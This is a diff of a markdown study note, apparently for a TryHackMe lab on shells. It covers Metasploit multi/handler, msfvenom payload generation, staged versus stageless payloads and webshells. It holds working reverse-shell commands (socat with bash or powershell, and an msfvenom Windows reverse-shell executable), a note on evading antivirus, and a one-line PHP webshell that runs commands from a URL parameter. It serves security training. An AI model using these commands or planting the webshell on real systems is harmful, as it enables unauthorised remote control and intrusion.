@@ -14,8 +14,9 @@ Most used shells: `bash`, `sh`, `cmd.exe`, `powershell.exe` & `/bin/zsh`
 
     `socat TCP-L:<PORT> -` + `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` or `EXEC:powershell.exe,pipes`
 
-3. Metasploit multi/handler
-4. Msfvenom
+3. Metasploit multi/handler: A superb tool for `catching reverse shells`.
+4. Msfvenom: Used to generate payloads (shells).
+5. Meterpreter: Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets.
 
 Another useful set of tools:
 1. `rlwrap`, a tool to wrap readline functionality for command-line utilities that lack it (e.g., netcat).
@@ -39,7 +40,7 @@ Another useful set of tools:
 
     Example: Can't run `ssh` but can run `whoami`, `pwd`, etc.
 
-Where to find shells:
+### Where to find shells
 1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 2. [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 3. [Revshells](https://www.revshells.com/)
@@ -109,3 +110,58 @@ When targeting a modern Windows Server, it is very common to require a Powershel
 In order to use this, we need to replace `"<IP>"` and `"<port>"` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell.
 
 ### Msfvenom
+The one-stop-shop for all things payload related. Mostly used for generating Buffer Overflow playloads, it can also generate to various formats; `.exe, .aspx, .war, .py, etc.`
+
+For example to generate a Windows x64 Reverse Shell in .exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.
+
+Here we are using a payload and four options:
+- `-f <format>`: Specifies the output format. In this case that is an executable (exe)
+- `-o <file>`: The output location and filename for the generated payload.
+- `LHOST=<IP>`: Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
+- `LPORT=<port>`: The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
+
+Before we go any further, there are another two concepts which must be introduced: `staged reverse shell payloads` and `stageless reverse shell payloads`.
+- Staged payloads are sent in two parts.
+
+    The first part is called the `stager`.
+    This is a piece of code which is executed directly on the server itself.
+    It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
+    Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
+
+- Stageless payloads are more common.
+
+    `Entirely self-contained` in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+
+Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.
+
+#### Payload Naming Conventions
+When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
+
+- `<OS>/<arch>/<payload>`.
+
+    For example: `linux/x86/shell_reverse_tcp`.
+    
+    The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.: `windows/shell_reverse_tcp`.
+
+- Stageless: `shell_reverse_tcp`. Stageless payloads are denoted with underscores (`_`).
+- Staged: `shell/reverse_tcp`. Staged payloads are denoted with another forward slash (`/`).
+
+Aside from the msfconsole man page, the other important thing to note when working with msfvenom is: `msfvenom --list payloads`.
+
+### Metasploit multi/handler
+The go-to when using staged payloads.
+
+1. Open Metasploit with msfconsole
+2. Type use multi/handler, and press enter
+3. Set the options needed
+4. Start the listener using `exploit -j`
+5. Use `sessions 1` to foreground it again.If you have more sessions running use `sessions` to get the session number. Then use `sessions <number>` to select the appropriate session to foreground.
+
+### WebShells
+There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible.
+
+As `PHP` is still the most common server side scripting language, let's have a look at some simple code for this in a very basic one line format: 
+
+`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+
+As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous `PentestMonkey php-reverse-shell` -- a full reverse shell written in PHP.
